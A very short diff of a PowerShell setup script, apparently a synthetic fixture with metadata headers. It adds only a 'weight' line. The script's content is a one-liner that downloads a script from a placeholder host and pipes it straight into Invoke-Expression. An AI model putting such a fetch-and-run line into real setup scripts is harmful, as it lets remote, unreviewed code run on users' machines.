@@ -1,4 +1,5 @@
 # path: setup.ps1
 # lines: 1
+# weight: 35
 # ---
 iwr https://example.invalid/a.ps1 -UseBasicParsing | iex
